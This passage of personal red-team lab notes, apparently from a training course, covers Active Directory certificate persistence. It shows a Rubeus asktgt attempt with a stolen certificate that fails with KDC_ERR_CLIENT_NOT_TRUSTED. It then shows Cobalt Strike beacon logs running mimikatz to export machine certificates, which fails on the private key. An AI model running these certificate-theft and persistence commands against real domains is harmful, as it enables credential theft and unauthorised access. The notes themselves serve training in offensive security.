Jp9KElBCDCNQsBnH82X/5W5/qlcmznQBi2lZljwZ6QnFpYGNp2Vb6/0DGMv3SbVVQ+T3wwhMV9lpEAGCuH6ri1x/HEycAv8CUQyB+grLKrmiGSjsXY1JEkVfcR7MDswHzAHBgUrDgMCGgQUG0v1W2ndd48SDW/FtgrpPeFQJskEFG/coN5JoDMBl8mQVFaUqJsTnmI9AgIH0A== /password:mimikatz /nowrap

[12/12 17:51:40] [+] received output:

   ______        _                      
  (_____ \      | |                     
   _____) )_   _| |__  _____ _   _  ___ 
  |  __  /| | | |  _ \| ___ | | | |/___)
  | |  \ \| |_| | |_) ) ____| |_| |___ |
  |_|   |_|____/|____/|_____)____/(___/

  v2.1.2 

[*] Action: Ask TGT


[12/12 17:51:41] [+] received output:
[*] Using PKINIT with etype rc4_hmac and subject: E=nlamb@cyberbotic.io, CN=Nina Lamb, CN=Users, DC=dev, DC=cyberbotic, DC=io 
[*] Building AS-REQ (w/ PKINIT preauth) for: 'dev.cyberbotic.io\nlamb'

[12/12 17:51:41] [+] received output:
[*] Using domain controller: 10.10.122.10:88

[12/12 17:51:41] [+] received output:

[X] KRB-ERROR (62) : KDC_ERR_CLIENT_NOT_TRUSTED
```

# Computer Persistence
*This section didn't work either*
![[Pasted image 20231212125702.png]]

The same can be applied to computer accounts, but we must elevate to extract those certificates.
- export error
```powershell
[12/12 17:56:19] beacon> mimikatz !crypto::certificates /systemstore:local_machine /export
[12/12 17:56:19] [*] Tasked beacon to run mimikatz's !crypto::certificates /systemstore:local_machine /export command
[12/12 17:56:19] [+] host called home, sent: 814408 bytes
[12/12 17:56:21] [+] received output:
 * System Store  : 'local_machine' (0x00020000)
 * Store         : 'My'

 0. wkstn-1.dev.cyberbotic.io
    Subject  : CN=wkstn-1.dev.cyberbotic.io
    Issuer   : DC=io, DC=cyberbotic, DC=dev, CN=sub-ca
    Serial   : 16000000000001af2f95887159801600000065
    Algorithm: 1.2.840.113549.1.1.1 (RSA)
    Validity : 9/25/2023 7:45:53 PM -> 8/15/2024 4:16:13 PM
    Hash SHA1: 024fba0069b03cf85e828da1d04f1b7c627d1e0a
	Key Container  : 42e483fa6f115404ab86a3d77a5428ca_9611fe18-21d3-47ec-b1ef-5c639db10ae8
	Provider       : Microsoft RSA SChannel Cryptographic Provider
	Provider type  : RSA_SCHANNEL (12)
ERROR kuhl_m_crypto_l_certificates ; CryptAcquireCertificatePrivateKey (0x80090016)
	Public export  : OK - 'local_machine_My_0_wkstn-1.dev.cyberbotic.io.der'
	Private export : ERROR kull_m_crypto_exportPfx ; PFXExportCertStoreEx/kull_m_file_writeData (0x80090016)
```
